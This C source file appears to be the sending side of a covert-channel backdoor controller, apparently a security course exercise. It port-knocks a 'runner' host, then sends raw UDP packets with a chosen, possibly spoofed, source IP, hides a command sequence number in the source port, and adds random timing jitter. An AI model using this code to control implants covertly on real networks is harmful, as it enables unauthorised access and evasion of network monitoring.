#include "network.h"

#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <time.h>
#include <sys/socket.h>
#include <unistd.h>


#define KNOCKS 3
#define COVERT_CHAN 8505
#define KNOCK2 1999
#define KNOCK3 1201

#define PKT_MAX_LEN 4096
#define IP_VERSION 4
#define IP_IHL 5             // 5 * 32-bit words = 20 bytes
#define IP_FRAG_OFF 0
#define IP_HDR_TOS 0
#define IP_HDR_TTL 64

int setup_covert_fd(void) {
    const int fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd == -1) {
        fprintf(stderr, "covert socket() failed\n");
        return -1;
    }

    const int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "setsockopt(IPPROTO_IP, IP_HDRINCL) failed\n");
        return -1;
    }

    return fd;
}

int perform_knock(const struct Context *ctx) {
    const int KNOCK_PORTS[KNOCKS] = {COVERT_CHAN, KNOCK2, KNOCK3};
    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    if (inet_pton(AF_INET, ctx->runner_ip, &dest.sin_addr) != 1) {
        perror("inet_pton");
        return -1;
    }

    for (int i = 0; i < KNOCKS; i++) {
        const int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd == -1) {
            perror("socket");
            return -1;
        }

        dest.sin_port = htons(KNOCK_PORTS[i]);

        if (connect(fd, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("connect");
            close(fd);
            return -1;
        }

        close(fd);

        sleep(1);
    }

    return 0;
}

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;

    for (; len > 1; len -= 2) {
        sum += *buf++;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}

void print_packet_info(uint8_t *packet) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *)udp + sizeof(struct udphdr);

    char src_ip[INET_ADDRSTRLEN];
    char dst_ip[INET_ADDRSTRLEN];

    inet_ntop(AF_INET, &ip->saddr, src_ip, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ip->daddr, dst_ip, INET_ADDRSTRLEN);

    uint16_t ip_len = ntohs(ip->tot_len);
    uint16_t udp_len = ntohs(udp->len);
    uint16_t payload_len = udp_len - sizeof(struct udphdr);

    printf("-----------------------Packet Info-----------------------\n");

    printf("IP Header:\n");
    printf("  Version        : %u\n", ip->version);
    printf("  Header Length  : %u bytes\n", ip->ihl * 4);
    printf("  TOS            : %u\n", ip->tos);
    printf("  Total Length   : %u\n", ip_len);
    printf("  ID             : %u\n", ntohs(ip->id));
    printf("  TTL            : %u\n", ip->ttl);
    printf("  Protocol       : %u\n", ip->protocol);
    printf("  Source IP      : %s\n", src_ip);
    printf("  Destination IP : %s\n", dst_ip);

    printf("\nUDP Header:\n");
    printf("  Source Port    : %u\n", ntohs(udp->source));
    printf("  Dest Port      : %u\n", ntohs(udp->dest));
    printf("  Length         : %u\n", udp_len);

    // printf("\nPayload (%u bytes):\n", payload_len);
    // for (uint16_t i = 0; i < payload_len; i++) {
    //     printf("%02x ", payload[i]);
    //     if ((i + 1) % 16 == 0)
    //         printf("\n");
    // }
    //
    // if (payload_len % 16 != 0)
    //     printf("\n");

    printf("---------------------------------------------------------\n");
}

int send_packet(struct Context *ctx, const char *ip_src_addr) {
    uint8_t packet[PKT_MAX_LEN] = {0};

    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    uint8_t *payload = (uint8_t *) udp + sizeof (struct udphdr);
    const uint16_t payload_size = rand_payload(ctx, payload);
    const uint16_t pkt_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;

    ip->ihl = IP_IHL;
    ip->version = IP_VERSION;
    ip->tos = IP_HDR_TOS;
    ip->tot_len = htons(pkt_len);
    ip->id = htons(rand_u16(ctx));
    ip->frag_off = IP_FRAG_OFF;
    ip->ttl = IP_HDR_TTL;
    ip->protocol = IPPROTO_UDP;
    ip->saddr = inet_addr(ip_src_addr);
    ip->daddr = inet_addr(ctx->runner_ip);
    checksum(ip, ip->ihl * 4);
    udp->source = htons(ctx->cmd_seq_num);
    udp->dest = htons(COVERT_CHAN);
    udp->len = htons(sizeof(struct udphdr) + payload_size);
    udp->check = 0;

    struct sockaddr_in dest = {0};
    dest.sin_family = AF_INET;
    dest.sin_port = htons(COVERT_CHAN);
    dest.sin_addr.s_addr = ip->daddr;

    const ssize_t ret = sendto(ctx->covert_fd, packet, pkt_len, 0, (struct sockaddr *)&dest, sizeof(dest));
    if (ret <= 0) {
        fprintf(stderr, "sento error\n");
    }
    print_packet_info(packet);

    if (ctx->cmd_seq_num == UINT16_MAX) {
        ctx->cmd_seq_num = 0;
    } else {
        (ctx->cmd_seq_num)++;
    }

    struct timespec sleep_time;
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = (rand_u8(ctx) + 500) * 1000000;

    printf("Sleep time: %zu milliseconds\n", sleep_time.tv_nsec / 1000000);
    nanosleep(&sleep_time, NULL);

    return 0;
}
